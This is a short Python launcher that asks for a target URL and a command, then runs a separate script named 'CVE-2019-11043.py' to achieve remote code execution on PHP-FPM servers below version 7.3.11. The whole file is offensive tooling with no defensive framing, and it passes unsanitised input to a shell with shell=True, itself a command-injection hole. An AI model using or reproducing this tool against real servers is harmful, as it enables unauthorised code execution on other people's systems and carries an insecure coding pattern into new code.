import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class CallExploit(object):
    def __init__(self, url, command):
        self.url = url
        self.command = command

    def send_exploit(self):
        sub.call(f"python3 CVE-2019-11043.py --command {self.command} --url {self.url} --verbose", shell=True)


if __name__ == "__main__":
    exploit = CallExploit(
        url=input(f"{Colors.red}(FPM+PHP-versions<7.3.11/Remote-Code-Execution){Colors.end} [Enter Target URL]:~#"),
        command=input(f"{Colors.red}(FPM+PHP-versions<7.3.11/Remote-Code-Execution){Colors.end} [Enter Command]:~#"))
    exploit.send_exploit()
